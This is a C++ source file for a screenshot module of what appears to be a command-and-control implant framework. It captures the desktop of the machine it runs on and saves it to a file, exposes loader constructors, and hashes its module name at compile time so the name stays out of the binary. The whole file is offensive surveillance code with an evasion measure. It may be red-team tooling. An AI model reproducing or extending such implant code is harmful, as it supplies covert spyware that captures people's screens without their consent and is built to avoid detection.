#include "ScreenShot.hpp"

// https://github.com/apriorit/Screenshot_Desktop/tree/master
#include "ScreenShooter.h"
#include "Common.hpp"

#include <cstring>

using namespace std;


// Compute hash of moduleName at compile time, so the moduleName string don't show in the binary
constexpr std::string_view moduleName = "screenShot";
constexpr unsigned long moduleHash = djb2(moduleName);

#ifdef _WIN32

__declspec(dllexport) ScreenShot* ScreenShotConstructor() 
{
    return new ScreenShot();
}

#else

__attribute__((visibility("default"))) ScreenShot* ScreenShotConstructor() 
{
    return new ScreenShot();
}

#endif

ScreenShot::ScreenShot()
#ifdef BUILD_TEAMSERVER
	: ModuleCmd(std::string(moduleName), moduleHash)
#else
	: ModuleCmd("", moduleHash)
#endif
{
}

ScreenShot::~ScreenShot()
{
}

std::string ScreenShot::getInfo()
{
	std::string info;
#ifdef BUILD_TEAMSERVER
	info += "ScreenShot:\n";
	info += "ScreenShot\n";
	info += "exemple:\n";
	info += "- ScreenShot\n";
#endif
	return info;
}

int ScreenShot::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
	if (splitedCmd.size() >= 2 )
	{
		string inputFile;
		for (int idx = 1; idx < splitedCmd.size(); idx++) 
		{
			if(!inputFile.empty())
				inputFile+=" ";
			inputFile+=splitedCmd[idx];
		}

		c2Message.set_instruction(splitedCmd[0]);
		c2Message.set_inputfile(inputFile);
	}
	else
	{
		c2Message.set_returnvalue(getInfo());
		return -1;
	}
#endif
	return 0;
}


#define ERROR_OPEN_FILE 1 

void SaveVectorToFile(const std::wstring& fileName, const std::vector<unsigned char>& data)
{
    HANDLE hFile = CreateFileW(fileName.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL);
    if(hFile == INVALID_HANDLE_VALUE)
		throw std::logic_error("SaveVectorToFile : can't open file ");
    guards::CHandleGuard fileGuard(hFile);
    DWORD bytesWriten = 0;
	if(!WriteFile(hFile, &data[0], (DWORD)data.size(), &bytesWriten, 0))
		throw std::logic_error("SaveVectorToFile : can't write to file ");
}

int ScreenShot::process(C2Message &c2Message, C2Message &c2RetMessage)
{
	c2RetMessage.set_instruction(c2RetMessage.instruction());

	std::cout << "ScreenShot " << std::endl;


	std::vector<unsigned char> dataScreen;
    ScreenShooter::CaptureScreen(dataScreen);

	const wchar_t* filename = L"test.bmp";
    SaveVectorToFile(filename, dataScreen);

	std::string buffer;
	c2RetMessage.set_returnvalue(buffer);

	return 0;
}


int ScreenShot::errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg)
{
#ifdef BUILD_TEAMSERVER
	int errorCode = c2RetMessage.errorCode();
	if(errorCode>0)
	{
		if(errorCode==ERROR_OPEN_FILE)
			errorMsg = "Failed: Couldn't open file";
	}
#endif
	return 0;
}
